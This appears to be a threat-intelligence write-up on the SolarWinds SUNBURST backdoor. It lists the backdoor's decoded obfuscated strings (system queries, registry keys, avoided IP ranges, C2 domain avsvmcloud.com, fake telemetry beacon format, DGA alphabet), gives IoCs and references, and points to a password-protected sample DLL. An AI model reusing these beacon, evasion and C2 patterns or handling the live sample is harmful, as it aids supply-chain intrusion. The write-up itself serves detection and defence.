c/FwDnDNS0zKSU0BAA==  ->  DHCPEnabled
c/FwDghOLSpLLQIA  ->  DHCPServer
c/EL9sgvLvFLzE0FAA==  ->  DNSHostName
c/ELdsnPTczMCy5NS8usCE5NLErO8C9KSS0CAA==  ->  DNSDomainSuffixSearchOrder
c/ELDk4tKkstCk5NLErO8C9KSS0CAA==  ->  DNSServerSearchOrder
8wxwTEkpSi0uBgA=  ->  IPAddress
8wwILk3KSy0BAA==  ->  IPSubnet
c0lNSyzNKfEMcE8sSS1PrAQA  ->  DefaultIPGateway
C07NSU0uUdBScCvKz1UIz8wzNor3L0gtSizJzEsPriwuSc0FAA==  ->  Select * From Win32_OperatingSystem
c04sKMnMzwMA  ->  Caption
8w92LErOyCxJTS4pLUoFAA==  ->  OSArchitecture
88wrLknMyXFJLEkFAA==  ->  InstallDate
8y9KT8zLrEosyczPAwA=  ->  Organization
C0pNzywuSS1KTQktTi0CAA==  ->  RegisteredUser
C0stKs7MzwMA  ->  Version
i3aNVag2qFWoNgRio1oA  ->  [E] {0} {1} {2}
8/B2jYz38Xd29In3dXT28PRzjQn2dwsJdwxyjfHNTC7KL85PK4lxLqosKMlPL0osyKgEAA==  ->  HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
801MzsjMS3UvzUwBAA==  ->  MachineGuid
MzTQA0MA  ->  10.0.0.0
MzI11TMAQQA=  ->  255.0.0.0
MzQ30jM00zPQMwAA  ->  172.16.0.0
MzI11TMyMdADQgA=  ->  255.240.0.0
M7Q00jM0s9Az0DMAAA==  ->  192.168.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
MzIy0TMAQQA=  ->  224.0.0.0
MzIx0ANDAA==  ->  240.0.0.0
S0s2MLCyAgA=  ->  fc00::
S0s1MLCyAgA=  ->  fe00::
S0tNNrCyAgA=  ->  fec0::
S0tLNrCyAgA=  ->  ffc0::
S0szMLCyAgA=  ->  ff00::
S0szMLCyAgA=  ->  ff00::
MzHUszDRMzS11DMAAA==  ->  41.84.159.0
MzI11TOCYgMA  ->  255.255.255.0
MzfRMzQ00TMy0TMAAA==  ->  74.114.24.0
MzI11TMCYRMLPQMA  ->  255.255.248.0
MzQ10TM0tNAzNDHQMwAA  ->  154.118.140.0
MzI11TOCYgMA  ->  255.255.255.0
MzI01zM0M9Yz1zMAAA==  ->  217.163.7.0
MzI11TOCYgMA  ->  255.255.255.0
MzLQMzQx0ANCAA==  ->  20.140.0.0
MzI11TMyNdEz0DMAAA==  ->  255.254.0.0
szTTMzbUMzQ30jMAAA==  ->  96.31.172.0
MzI11TOCYgMA  ->  255.255.255.0
MzQ21DMystAzNNIzAAA=  ->  131.228.12.0
MzI11TMCYyM9AwA=  ->  255.255.252.0
MzQx0bMw0zMyMtMzAAA=  ->  144.86.226.0
MzI11TOCYgMA  ->  255.255.255.0
s9AztNAzNDHRMwAA  ->  8.18.144.0
MzI11TMCYxM9AwA=  ->  255.255.254.0
M7TQMzQ20ANCAA==  ->  18.130.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
MzfUMzQ10jM11jMAAA==  ->  71.152.53.0
MzI11TOCYgMA  ->  255.255.255.0
s7TUM7fUM9AzAAA=  ->  99.79.0.0
MzI11TMCYgM9AwA=  ->  255.255.0.0
szDXMzK20LMw0DMAAA==  ->  87.238.80.0
MzI11TMCYRMLPQMA  ->  255.255.248.0
M7S01DMyMNQzNDTXMwAA  ->  199.201.117.0
MzI11TOCYgMA  ->  255.255.255.0
M7Qw0TM30jPQMwAA  ->  184.72.0.0
MzI11TMyNdEz0DMAAA==  ->  255.254.0.0
07DP1NSIjkvUrYqtidPUKEktLoHzVTQB  ->  (?i)([^a-z]|^)(test)([^a-z]|$)
07DP1NQozs9JLCrPzEsp1gQA  ->  (?i)(solarwinds)
C0otyC8qCU8sSc5ILQpKLSmqBAA=  ->  ReportWatcherRetry
C0otyC8qCU8sSc5ILQrILy4pyM9LBQA=  ->  ReportWatcherPostpone
SyzI1CvOz0ksKs/MSynWS87PBQA=  ->  api.solarwinds.com
SywrLstNzskvTdFLzs8FAA==  ->  avsvmcloud.com
SywoKK7MS9ZNLMgEAA==  ->  appsync-api
Sy3VLU8tLtE1BAA=  ->  eu-west-1
Ky3WLU8tLtE1AgA=  ->  us-west-2
Ky3WTU0sLtE1BAA=  ->  us-east-1
Ky3WTU0sLtE1AgA=  ->  us-east-2
M7UwTkm0NDHVNTNKTNM1NEi10DWxNDDSTbRIMzIwTTY3SjJKBQA=  ->  583da945-62af-10e8-4902-a8f205c72b2e
8/B2jYx39nEMDnYNjg/y9w8BAA==  ->  HKEY_CLASSES_ROOT
8/B2DgIA  ->  HKCR
8/B2jYx3Dg0KcvULiQ8Ndg0CAA==  ->  HKEY_CURRENT_USER
8/B2DgUA  ->  HKCU
8/B2jYz38Xd29In3dXT28PRzBQA=  ->  HKEY_LOCAL_MACHINE
8/D28QUA  ->  HKLM
8/B2jYwPDXYNCgYA  ->  HKEY_USERS
8/AOBQA=  ->  HKU
8/B2jYx3Dg0KcvULiXf293PzdAcA  ->  HKEY_CURRENT_CONFIG
8/B2dgYA  ->  HKCC
8/B2jYwPcA1y8/d19HN2jXdxDHEEAA==  ->  HKEY_PERFOMANCE_DATA
8/AOcAEA  ->  HKPD
8/B2jYx3ifSLd3EMcQQA  ->  HKEY_DYN_DATA
8/B2cQEA  ->  HKDD
C9Y11DXVBQA=  ->  S-1-5-
0zU1MAAA  ->  -500
c0zJzczLLC4pSizJLwIA  ->  Administrator
C07NSU0uUdBScCvKz1UIz8wzNooPLU4tckxOzi/NKwEA  ->  Select * From Win32_UserAccount
C/Z0AQA=  ->  SID
88lPTsxxTE7OL80rAQA=  ->  LocalAccount
KykqTQUA  ->  true
C04NSi0uyS9KDSjKLMvMSU1PBQA=  ->  SeRestorePrivilege
C04NScxO9S/PSy0qzsgsCCjKLMvMSU1PBQA=  ->  SeTakeOwnershipPrivilege
C44MDnH1BQA=  ->  SYSTEM
MwEA  ->  4
MwUA  ->  5
MwYA  ->  3
C07NSU0uUdBScCvKz1UIz8wzNooPriwuSc11KcosSy0CAA==  ->  Select * From Win32_SystemDriver
C0gsyfBLzE0FAA==  ->  PathName
C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=  ->  SYSTEM\CurrentControlSet\services
Cy5JLCoBAA==  ->  Start
Cy5JLCoBAA==  ->  Start
C44MDnH1jXEuLSpKzStxzs8rKcrPCU4tiSlOLSrLTE4tBgA=  ->  SYSTEM\CurrentControlSet\services
Cy5JLCoBAA==  ->  Start
Cy5JLCoBAA==  ->  Start
i6420DGtjVWoNqzlAgA=  ->  [{0,5}] {1}
C07NSU0uUdBScCvKz1UIz8wzNooPKMpPTi0uBgA=  ->  Select * From Win32_Process
c08t8S/PSy0CAA==  ->  GetOwner
i6420DGtjVWoNtTRNTSrVag2quWsNgYKKVSb1MZUm9ZyAQA=  ->  [{0,5}] {1,-16} {2}	{3,5} {4}\{5}
CyjKT04tLvZ0AQA=  ->  ProcessID
80vMTQUA  ->  Name
C0gsSs0rCSjKT04tLvZ0AQA=  ->  ParentProcessID
c0zJzczLLC4pSizJLwIA  ->  Administrator
qzaoVag2rFXwCAkJ0K82quUCAA==  ->  {0} {1} HTTP/{2}
U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA  ->  "\{[0-9a-f-]{36}\}"|"[0-9a-f]{32}"|"[0-9a-f]{16}"
80zT9cvPS9X1TSxJzgAA  ->  If-None-Match
UyotTi3yTFGyUqo2qFXSAQA=  ->  "userId":"{0}",
UypOLS7OzM/zTFGyUqo2qFXSAQA=  ->  "sessionId":"{0}",
UyouSS0oVrKKBgA=  ->  "steps":[
UwrJzE0tLknMLVCyUorRd0ksSdWoNqjVjNFX0gEA  ->  "Timestamp":"\/Date({0})\/",
U/LMS0mtULKqNqjVAQA=  ->  "Index":{0},
U3ItS80rCaksSFWyUvIvyszPU9IBAA==  ->  "EventType":"Orion",
U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==  ->  "EventName":"EventManager",
U3IpLUosyczP8y1Wsqo2qNUBAA==  ->  "DurationMs":{0},
UwouTU5OTU1JTVGyKikqTdUBAA==  ->  "Succeeded":true,
U/JNLS5OTE9VslKqNqhVAgA=  ->  "Message":"{0}"
SywoyMlMTizJzM/TzyrOzwMA  ->  application/json
SywoyMlMTizJzM/Tz08uSS3RLS4pSk3MBQA=  ->  application/octet-stream
0y3Kzy8BAA==  ->  -root
001OLSoBAA==  ->  -cert
0y3NyyxLLSpOzIlPTgQA  ->  -universal_ca
001OBAA=  ->  -ca
0y0oysxNLKqMT04EAA==  ->  -primary_ca
0y3JzE0tLknMLQAA  ->  -timestamp
003PyU9KzAEA  ->  -global
0y1OTS4tSk1OBAA=  ->  -secureca
K8jO1E8uytGvNqitNqytNqrVA/IA  ->  pki/crl/{0}{1}{2}.crl
c8rPSQEA  ->  Bold
c8rPSfEsSczJTAYA  ->  BoldItalic
c60oKUp0ys9JAQA=  ->  ExtraBold
c60oKUp0ys9J8SxJzMlMBgA=  ->  ExtraBoldItalic
8yxJzMlMBgA=  ->  Italic
88lMzygBAA==  ->  Light
88lMzyjxLEnMyUwGAA==  ->  LightItalic
C0pNL81JLAIA  ->  Regular
C07NzXTKz0kBAA==  ->  SemiBold
C07NzXTKz0nxLEnMyUwGAA==  ->  SemiBoldItalic
yy9IzStOzCsGAA==  ->  opensans
y8svyQcA  ->  noto
SytKTU3LzysBAA==  ->  freefont
C84vLUpOdc5PSQ0oygcA  ->  SourceCodePro
C84vLUpODU4tykwLKMoHAA==  ->  SourceSerifPro
C84vLUpO9UjMC07MKwYA  ->  SourceHanSans
C84vLUpO9UjMC04tykwDAA==  ->  SourceHanSerif
S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA  ->  fonts/woff/{0}-{1}-{2}-webfont{3}.woff2
S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=  ->  fonts/woff/{0}-{1}-{2}{3}.woff2
C87PSSwKz8xLKQYA  ->  SolarWinds
03POLypJrQjIKU3PzAMA  ->  .CortexPlugin
0/MvyszPAwA=  ->  .Orion
C88sSs1JLS4GAA==  ->  Wireless
C/UEAA==  ->  UI
C89MSU8tKQYA  ->  Widgets
8wvwBQA=  ->  NPM
cyzIz8nJBwA=  ->  Apollo
c87JL03xzc/LLMkvysxLBwA=  ->  CloudMonitoring
88tPSS0GAA==  ->  Nodes
C8vPKc1NLQYA  ->  Volumes
88wrSS1KS0xOLQYA  ->  Interfaces
c87PLcjPS80rKQYA  ->  Components
Ky7PLNAvLUjRBwA=  ->  swip/upd/
06vIzQEA  ->  .xml
Ky7PLNAPLcjJT0zRSyzOqAAA  ->  swip/Upload.ashx
Ky7PLNB3LUvNKykGAA==  ->  swip/Events
881MLsovzk8r0XUuqiwoyXcM8NQHAA==  ->  Microsoft-CryptoAPI/
C87PSSwKz8xLKfYvyszP88wtKMovS81NzStxzskEkvoA  ->  SolarWindsOrionImprovementClient/
i/EvyszP88wtKMovS81NzSuJCc7PSSwKz8xLKdZDl9NLrUgFAA==  ->  \OrionImprovement\SolarWinds.OrionImprovement.exe
M9YzAEJjCyMA  ->  3.0.0.382
Kyo0Ti9OzCkxKzXMrEyryi8wNTdKMbFMyquwSC7LzU4tz8gCAA==  ->  rq3gsalt6u1iyfzop572d49bnx8cvmkewhj
M4jX1QMA  ->  0_-.
K8gwSs1MyzfOMy0tSTfMskixNCksKkvKzTYoTswxN0sGAA==  ->  ph2eifo3n5utg1j8d94qrvbmk0sal76c
MzA0MjYxNTO3sExMSk5JTUvPyMzKzsnNyy8oLCouKS0rr6is0o3XAwA=  ->  0123456789abcdefghijklmnopqrstuvwxyz-_.
0403AAA=  ->  -_0
C04NzigtSckvzwsoyizLzElNTwUA  ->  SeShutdownPrivilege
```

## Domain Lookup
```
Registered: July 25, 2018  [2 years old]
Updated: October 08, 2020  [2 months ago]
Expiry: July 25, 2023  [2 years left]
```

## IoCs

```
02af7cec58b9a5da1c542b5a32151ba1
b91ce2fa41029f6955bff20079468448
08e35543d6110ed11fdf558bb093d401
2c4a910a1299cdae2a4e55988a2f102e
846e27a652a5e1bfbd0ddd38a16dc865
4f2eb62fa529c0283b28d05ddd311fae
56ceb6d0011d87b6e4d7023d7ef85676
```

```
avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.eu-west-1.avsvmcloud[.]com 
.appsync-api.eu-west-1.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-west-2.avsvmcloud[.]com
.appsync-api.us-east-2.avsvmcloud[.]com
freescanonline[.]com
deftsecurity[.]com
thedoccloud[.]com
incomeupdate[.]com
websitetheme[.]com
zupertech[.]com
highdatabase[.]com
panhardware[.]com
databasegalore[.]com
```

```
5.252.177.25
5.252.177.21
204.188.205.176
51.89.125.18
167.114.213.199
```

## References
- https://www.solarwinds.com/security/security-statement
- https://github.com/fireeye/sunburst_countermeasures
- https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html
- https://www.zdnet.com/article/microsoft-fireeye-confirm-solarwinds-supply-chain-attack/
- https://cyber.dhs.gov/ed/21-01/
- https://pastebin.com/raw/T0SRGkWq (pdns)

## Files
- SolarWinds.Orion.Core.BusinessLayer.dll.zip pass: infected

## Mapped Attacks Refs
[https://tools.qeeqbox.com/mitre-visualizer.html](https://tools.qeeqbox.com/mitre-visualizer.html)

<img src="https://raw.githubusercontent.com/qeeqbox/mitre-visualizer/main/readme/intro.png" style="max-width:768px"/>
